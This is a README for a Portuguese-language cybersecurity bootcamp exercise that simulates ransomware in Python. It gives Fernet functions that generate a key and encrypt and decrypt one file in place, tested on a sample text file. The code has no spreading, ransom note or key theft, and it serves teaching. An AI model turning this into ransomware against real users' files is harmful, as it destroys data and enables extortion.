<h1>
<a href="https://www.dio.me/">
     <img align="center" width="40px" src="https://hermes.digitalinnovation.one/assets/diome/logo-minimized.png"></a>
    <span> Santander Bootcamp Cibersegurança #2</span>
</h1>

# :computer: Entendendo um Ransomware na Prática com Python

O objetivo desse desafio é criar um código para (des)criptografar arquivos simulando um ransomware. 

[Github instrutor](https://github.com/cassiano-dio/cibersecurity-desafio-ransomware)


# :bulb: Solução do desafio

Foi criado uma função para criptografar e outra para descriptografar o arquivo. O arquivo é sobrescrito com mesmo nome. Outra função gera a chave de criptografia. 

```python
import os
from cryptography.fernet import Fernet

def generate_key():
    """Generate a key for encryption and decryption"""
    key = Fernet.generate_key()
    return key

def encrypt_file(key, file_path):
    """Encrypt a file using the provided key"""
    f = Fernet(key)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def decrypt_file(key, file_path):
    """Decrypt a file using the provided key"""
    f = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)
```

Criamos uma chave aleatória:

```python
key = generate_key()
print("Generated Key:", key)
```
```console
Generated Key: b'cFlep4nNedgFw5xMM2Emq8qhTufKYOX7rpLwfNWWSjI='
```

Vamos testar com o arquivo:

```console
$ cat teste_cripto.txt
teste criptografia de arquivo.
```

Criptografando:
```python
file_path = "teste_cripto.txt"
encrypt_file(key, file_path)
print("File encrypted successfully!")
!cat teste_cripto.txt
```
```console
File encrypted successfully!
gAAAAABndC9YWcd-xRcpOa5NbKXQknj0du-GqlqHihkhOlh83YO-0AUCPVMkg31CuPlF_7Y-k5OVfxxRVe6-w4lRnJEb5yNxyyF0s7arepgAt1TidOZVa84=
```

Descriptografando:

```python
decrypt_file(key, file_path)
print("File decrypted successfully!")
!cat teste_cripto.txt
```
```console
File decrypted successfully!
teste criptografia de arquivo.
```

O código completo está no arquivo `ransom.ipynb`